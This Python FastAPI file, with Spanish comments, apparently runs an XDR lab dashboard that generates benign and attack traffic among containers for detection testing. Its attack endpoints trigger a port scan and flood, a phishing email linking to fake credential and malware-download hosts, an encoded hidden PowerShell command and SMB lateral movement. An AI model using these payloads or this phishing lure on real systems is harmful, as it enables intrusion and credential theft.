import os
import time
import requests
import logging
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
from fastapi.templating import Jinja2Templates

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] [DashboardC2] %(message)s")
logger = logging.getLogger("DashboardC2")

app = FastAPI(title="Lab Dashboard C2 - Orchestrator", version="2.0.0")

# Motor de plantillas (Jinja2)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
templates = Jinja2Templates(directory=os.path.join(BASE_DIR, "templates"))

# Configuración de URLs y Direcciones de la Topología
ATTACKER_URL = os.getenv("ATTACKER_URL", "http://xdr-emu-attacker:5000")
PARTNER_EXT_URL = os.getenv("PARTNER_EXT_URL", "http://xdr-legit-partner-ext:5000")
ROUTER_ISP_URL = os.getenv("ROUTER_ISP_URL", "http://xdr-legit-router-isp:80")
WORKSTATION_URL = os.getenv("WORKSTATION_URL", "http://xdr-emu-workstation:5001")
WEB_SRV_IP = os.getenv("WEB_SRV_IP", "172.16.0.10")
WEB_ERP_IP = os.getenv("WEB_ERP_IP", "172.16.0.11")
MAIL_SRV_IP = os.getenv("MAIL_SRV_IP", "172.16.0.20")
DB_INTERNAL_IP = os.getenv("DB_INTERNAL_IP", "10.20.30.50")
DB_ANALYTICS_IP = os.getenv("DB_ANALYTICS_IP", "10.20.30.51")
ROUTER_GATEWAY_IP = os.getenv("ROUTER_GATEWAY_IP", "172.16.0.1")

WEB_INTRANET_URL = os.getenv("WEB_INTRANET_URL", "http://xdr-legit-web-intranet:80")
WEB_ERP_URL = os.getenv("WEB_ERP_URL", "http://xdr-legit-web-erp:80")
SW_DMZ_URL = os.getenv("SW_DMZ_URL", "http://xdr-legit-sw-dmz:80")
SW_CORE_URL = os.getenv("SW_CORE_URL", "http://xdr-legit-sw-core:80")
SW_ACCESS_URL = os.getenv("SW_ACCESS_URL", "http://xdr-legit-sw-access:80")

WORKSTATIONS_STR = os.getenv("WORKSTATIONS", "")
WORKSTATIONS_LIST = [w.strip() for w in WORKSTATIONS_STR.split(",") if w.strip()]

SWITCHES_STR = os.getenv("SWITCHES", "")
SWITCHES_LIST = [s.strip() for s in SWITCHES_STR.split(",") if s.strip()]

TOPOLOGY_MODE = os.getenv("TOPOLOGY_MODE", "BASE")

@app.get("/", response_class=HTMLResponse)
def index(request: Request):
    """Renderiza el Lab Dashboard."""
    is_15_nodes = TOPOLOGY_MODE == "15_NODES" or len(WORKSTATIONS_LIST) > 1
    return templates.TemplateResponse(
        request=request, 
        name="index.html",
        context={
            "is_15_nodes": is_15_nodes,
            "topology_mode": TOPOLOGY_MODE,
            "workstations_count": len(WORKSTATIONS_LIST) if WORKSTATIONS_LIST else 1,
            "switches_count": len(SWITCHES_LIST)
        }
    )

# =========================================================================
# ENDPOINTS DE CONTROL (ORQUESTACIÓN DE TRÁFICO FÍSICO REAL EN CONTENEDORES)
# =========================================================================

@app.post("/api/normal/network")
def normal_network():
    """Ordena a la estación Workstation generar una transacción web legítima real."""
    logger.info(f"Orquestando tráfico normal en {WORKSTATION_URL}")
    try:
        res = requests.post(f"{WORKSTATION_URL}/traffic/generate-now", timeout=10.0)
        return {
            "status": "success",
            "message": "Tráfico web legítimo ejecutado físicamente en la red desde VENTAS-PC",
            "details": res.json()
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Workstation: {e}")
        return {"status": "error", "message": f"Error comunicando con Workstation ({WORKSTATION_URL}): {str(e)}"}

@app.post("/api/normal/multi-device")
def normal_multi_device():
    """
    Orquesta tráfico legítimo simultáneo en los 15 dispositivos de la topología:
    1. Estaciones de trabajo (Ventas, Finanzas, RRHH, TI) consultan portales DMZ (ERP e Intranet).
    2. PC RRHH envía correo corporativo legítimo vía SMTP a CORP-MAIL (172.16.0.20:25).
    3. PC TI realiza sondeo a switches gestionados (SW-DMZ, SW-CORE, SW-ACCESS) y router gateway (172.16.0.1).
    4. Servidores Web DMZ consultan bases de datos transaccionales de la LAN (10.20.30.50 y 10.20.30.51).
    5. Switch DMZ (172.16.0.2) sondea a switches LAN (10.20.30.2 y 10.20.30.3).
    6. Switch LAN Core (10.20.30.2) sondea a Switch DMZ (172.16.0.2).
    7. Cliente Socio Comercial WAN (185.15.2.2) realiza petición autorizada a Intranet DMZ (172.16.0.10).
    8. Router ISP WAN (185.15.2.3) ejecuta sondeo de conectividad hacia DMZ ERP (172.16.0.11) y Gateway (172.16.0.1).
    """
    logger.info("Orquestando tráfico legítimo multi-dispositivo completo (15 nodos)...")
    results = {
        "workstations": [],
        "dmz_to_db": [],
        "switches": [],
        "wan": [],
        "mail": None
    }
    
    # 1. Estaciones de Trabajo -> DMZ
    ws_targets = {
        "xdr-legit-pc-ventas": f"http://{WEB_ERP_IP}/",
        "xdr-legit-pc-finanzas": f"http://{WEB_ERP_IP}/",
        "xdr-legit-pc-rrhh": f"http://{WEB_SRV_IP}/",
        "xdr-legit-pc-ti": f"http://{WEB_SRV_IP}/"
    }

    target_workstations = WORKSTATIONS_LIST if WORKSTATIONS_LIST else [WORKSTATION_URL]
    for ws_url in target_workstations:
        target_portal = None
        for key, url in ws_targets.items():
            if key in ws_url:
                target_portal = url
                break
        
        try:
            if target_portal:
                r = requests.post(f"{ws_url}/traffic/send-to?target={target_portal}", timeout=4.0)
            else:
                r = requests.post(f"{ws_url}/traffic/generate-now", timeout=4.0)
            results["workstations"].append({"url": ws_url, "target": target_portal, "status": "ok", "data": r.json()})
        except Exception as e:
            results["workstations"].append({"url": ws_url, "status": "error", "error": str(e)})

    # 2. PC RRHH -> Envío de Correo Corporativo (SMTP :25 a 172.16.0.20)
    rrhh_url = next((w for w in target_workstations if "rrhh" in w), None)
    if rrhh_url:
        try:
            r = requests.post(f"{rrhh_url}/traffic/send-mail?target_ip={MAIL_SRV_IP}&recipient=reporte.semanal@corp.local", timeout=5.0)
            results["mail"] = {"sender": "PC-RRHH", "target": f"{MAIL_SRV_IP}:25", "result": r.json()}
        except Exception as e:
            results["mail"] = {"sender": "PC-RRHH", "error": str(e)}

    # 3. PC TI -> Sondeo de switches gestionados y Gateway
    ti_url = next((w for w in target_workstations if "ti" in w), None)
    if ti_url:
        probe_targets = [
            f"http://{ROUTER_GATEWAY_IP}/",
            "http://172.16.0.2/health",
            "http://10.20.30.2/health",
            "http://10.20.30.3/health"
        ]
        ti_probes = []
        for pt in probe_targets:
            try:
                r = requests.post(f"{ti_url}/traffic/send-to?target={pt}", timeout=3.0)
                ti_probes.append({"target": pt, "status": "ok", "data": r.json()})
            except Exception as e:
                ti_probes.append({"target": pt, "status": "error", "error": str(e)})
        results["workstations"].append({"url": ti_url, "probes": ti_probes})

    # 4. Servidores Web DMZ -> Bases de Datos LAN (10.20.30.50 y 10.20.30.51)
    dmz_servers = [
        (WEB_INTRANET_URL, DB_INTERNAL_IP),
        (WEB_ERP_URL, DB_ANALYTICS_IP)
    ]
    for srv_url, db_ip in dmz_servers:
        try:
            r = requests.post(f"{srv_url}/api/db-query?target_db={db_ip}", timeout=3.0)
            results["dmz_to_db"].append({"from": srv_url, "to": db_ip, "status": "ok", "data": r.json()})
        except Exception as e:
            results["dmz_to_db"].append({"from": srv_url, "to": db_ip, "status": "error", "error": str(e)})

    # 5. Switches -> Sondeo de red cruzada y telemetría
    sw_probes = [
        (SW_DMZ_URL, f"http://{ROUTER_GATEWAY_IP}/"),
        (SW_DMZ_URL, "http://10.20.30.2/health"),
        (SW_DMZ_URL, "http://10.20.30.3/health"),
        (SW_CORE_URL, "http://172.16.0.2/health"),
        (SW_ACCESS_URL, "http://172.16.0.2/health")
    ]
    for src_sw, tgt in sw_probes:
        try:
            r = requests.post(f"{src_sw}/traffic/probe?target={tgt}", timeout=3.0)
            results["switches"].append({"from": src_sw, "target": tgt, "status": "ok", "data": r.json()})
        except Exception as e:
            results["switches"].append({"from": src_sw, "target": tgt, "status": "error", "error": str(e)})

    # 6. WAN -> Segmento DMZ (Cliente externo y Router ISP)
    # Partner Comercial -> Intranet
    try:
        r = requests.post(f"{PARTNER_EXT_URL}/traffic/benign-request?target_url=http://{WEB_SRV_IP}/", timeout=4.0)
        results["wan"].append({"from": "PARTNER-EXT (185.15.2.2)", "target": f"http://{WEB_SRV_IP}/", "status": "ok", "data": r.json()})
    except Exception as e:
        results["wan"].append({"from": "PARTNER-EXT (185.15.2.2)", "status": "error", "error": str(e)})

    # Router ISP -> DMZ ERP & Gateway
    for tgt in [f"http://{WEB_ERP_IP}/", f"http://{ROUTER_GATEWAY_IP}/"]:
        try:
            r = requests.post(f"{ROUTER_ISP_URL}/traffic/probe?target={tgt}", timeout=3.0)
            results["wan"].append({"from": "ROUTER-ISP (185.15.2.3)", "target": tgt, "status": "ok", "data": r.json()})
        except Exception as e:
            results["wan"].append({"from": "ROUTER-ISP (185.15.2.3)", "target": tgt, "status": "error", "error": str(e)})

    return {
        "status": "success",
        "message": "Tráfico legítimo distribuido ejecutado exitosamente en los 15 dispositivos de la red (PCs, Switches, Servidores DMZ, DBs, Router y WAN).",
        "details": results
    }

@app.post("/api/normal/switches")
def poll_switches():
    """Sondea el estado y telemetría de los switches gestionados (L2/L3)."""
    logger.info("Sondeando switches gestionados...")
    results = []
    for sw_url in SWITCHES_LIST:
        try:
            r = requests.get(f"{sw_url}/health", timeout=3.0)
            results.append({"url": sw_url, "health": r.json()})
        except Exception as e:
            results.append({"url": sw_url, "error": str(e)})
    return {
        "status": "success" if results else "notice",
        "message": f"Sondeo completado en {len(results)} switches.",
        "switches": results
    }

@app.get("/api/topology/info")
def get_topology_info():
    """Retorna metadatos de la topología activa."""
    return {
        "mode": TOPOLOGY_MODE,
        "is_15_nodes": TOPOLOGY_MODE == "15_NODES" or len(WORKSTATIONS_LIST) > 1,
        "workstations_count": len(WORKSTATIONS_LIST) if WORKSTATIONS_LIST else 1,
        "switches_count": len(SWITCHES_LIST)
    }

@app.post("/api/attack/network")
def attack_network():
    """Ordena al nodo Atacante ejecutar un escaneo TCP SYN y ráfagas de paquetes hacia la DMZ."""
    logger.info(f"Orquestando escaneo de red en {ATTACKER_URL} -> {WEB_SRV_IP}")
    try:
        # 1. Escaneo de puertos L4
        scan_payload = {"target_ip": WEB_SRV_IP, "ports": "80,445,25,5432"}
        res_scan = requests.post(f"{ATTACKER_URL}/attack/scan", json=scan_payload, timeout=20.0)
        
        # 2. Ráfaga de paquetes hacia el puerto 80
        flood_payload = {"target_ip": WEB_SRV_IP, "target_port": 80, "count": 40, "delay": 0.01}
        res_flood = requests.post(f"{ATTACKER_URL}/attack/flood", json=flood_payload, timeout=10.0)
        
        return {
            "status": "success",
            "message": "Tráfico L3/L4 real emitido físicamente desde 185.15.2.2 hacia la DMZ (172.16.0.10)",
            "details": {
                "scan": res_scan.json(),
                "flood": res_flood.json()
            }
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Atacante: {e}")
        return {"status": "error", "message": f"Error comunicando con Atacante ({ATTACKER_URL}): {str(e)}"}

@app.post("/api/attack/endpoint")
def attack_endpoint():
    """Ordena a la Workstation ejecutar en memoria una carga sospechosa y emitir Sysmon EventID 1."""
    logger.info(f"Orquestando telemetría de endpoint en {WORKSTATION_URL}")
    try:
        res = requests.post(f"{WORKSTATION_URL}/trigger-payload", timeout=10.0)
        return {
            "status": "success",
            "message": "Carga de malware simulada en VENTAS-PC. Telemetría Sysmon EventID 1 generada.",
            "details": res.json()
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Workstation: {e}")
        return {"status": "error", "message": f"Error comunicando con Workstation ({WORKSTATION_URL}): {str(e)}"}

@app.post("/api/attack/email")
def attack_email():
    """Ordena al Atacante enviar un correo malicioso real vía SMTP al puerto 25 del servidor de correo."""
    logger.info(f"Orquestando campaña de phishing en {ATTACKER_URL} -> {MAIL_SRV_IP}:25")
    try:
        phish_payload = {
            "target_ip": MAIL_SRV_IP,
            "target_port": 25,
            "recipient": "director@corp-mail.local",
            "sender": "alert@banking-security-update.com",
            "subject": "URGENTE: Cuenta corporativa bloqueada por actividad inusual",
            "body": "Por favor verifique sus credenciales inmediatamente en: http://secure-login-verify-account-update.com/login.php\nDescargue parche: http://malicious-cdn.xyz/patch.exe"
        }
        res = requests.post(f"{ATTACKER_URL}/attack/send-phishing", json=phish_payload, timeout=15.0)
        return {
            "status": "success",
            "message": f"Email malicioso transmitido por socket SMTP al puerto 25 de {MAIL_SRV_IP}",
            "details": res.json()
        }
    except Exception as e:
        logger.error(f"Fallo contactando a Atacante para Phishing: {e}")
        return {"status": "error", "message": f"Error comunicando con Atacante ({ATTACKER_URL}): {str(e)}"}

@app.post("/api/attack/lateral")
def attack_lateral():
    """
    Orquesta un escenario real de Movimiento Lateral en 3 fases:
    1. Atacante (185.15.2.2) ataca y explota DMZ Web (172.16.0.10) vía HTTP real.
    2. Ejecución local en DMZ generando telemetría Sysmon en host.
    3. Conexión este-oeste hacia Servidor de Base de Datos (10.20.30.50) por SMB (puerto 445).
    """
    logger.info("Iniciando orquestación de Movimiento Lateral multi-etapa...")
    try:
        # Paso 1: Exploit Web real
        logger.info(f"Paso 1: Exploit HTTP de {ATTACKER_URL} a {WEB_SRV_IP}")
        exploit_payload = {
            "target_ip": WEB_SRV_IP,
            "cmd": "cmd.exe /c powershell.exe -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA..."
        }
        res_step1 = requests.post(f"{ATTACKER_URL}/attack/web-exploit", json=exploit_payload, timeout=10.0)
        
        # Pequeña pausa táctica
        time.sleep(1.5)
        
        # Paso 2: Conexión Este-Oeste hacia la Base de Datos interna por SMB (puerto 445)
        logger.info(f"Paso 2: Conexión lateral hacia DB {DB_INTERNAL_IP}:445")
        lateral_payload = {
            "target_ip": DB_INTERNAL_IP,
            "target_port": 445
        }
        res_step2 = requests.post(f"{ATTACKER_URL}/attack/lateral-smb", json=lateral_payload, timeout=10.0)

        return {
            "status": "success",
            "message": "Escenario completo de Movimiento Lateral ejecutado físicamente en la red.",
            "details": {
                "step_1_web_exploit": res_step1.json(),
                "step_2_lateral_smb": res_step2.json()
            }
        }
    except Exception as e:
        logger.error(f"Fallo durante la orquestación de Movimiento Lateral: {e}")
        return {"status": "error", "message": f"Error en orquestación de Movimiento Lateral: {str(e)}"}
